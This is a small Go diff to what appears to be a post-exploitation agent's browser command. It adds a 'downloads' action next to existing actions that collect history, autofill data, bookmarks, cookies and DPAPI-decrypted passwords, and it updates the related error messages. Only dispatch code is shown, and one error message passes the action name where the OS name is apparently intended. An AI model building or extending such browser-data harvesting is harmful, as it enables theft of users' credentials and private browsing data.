@@ -49,15 +49,17 @@ func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
 		return browserAutofill(args)
 	case "bookmarks":
 		return browserBookmarks(args)
+	case "downloads":
+		return browserDownloads(args)
 	case "cookies":
 		if strings.EqualFold(args.Browser, "firefox") {
 			return browserFirefoxCookies(args)
 		}
 		return errorf("Action 'cookies' requires DPAPI decryption for Chromium browsers and is only supported on Windows. Use -browser firefox for Firefox cookies on %s.", runtime.GOOS)
 	case "passwords":
-		return errorf("Action 'passwords' requires DPAPI/Keychain decryption and is only supported on Windows. Use 'history', 'autofill', 'bookmarks', or 'cookies -browser firefox' on %s.", args.Action)
+		return errorf("Action 'passwords' requires DPAPI/Keychain decryption and is only supported on Windows. Use 'history', 'autofill', 'bookmarks', 'downloads', or 'cookies -browser firefox' on %s.", args.Action)
 	default:
-		return errorf("Unknown action: %s. Use: history, autofill, bookmarks, cookies (Firefox cookies on all platforms; Chromium cookies Windows-only)", args.Action)
+		return errorf("Unknown action: %s. Use: history, autofill, bookmarks, downloads, cookies (Firefox cookies on all platforms; Chromium cookies Windows-only)", args.Action)
 	}
 }
 
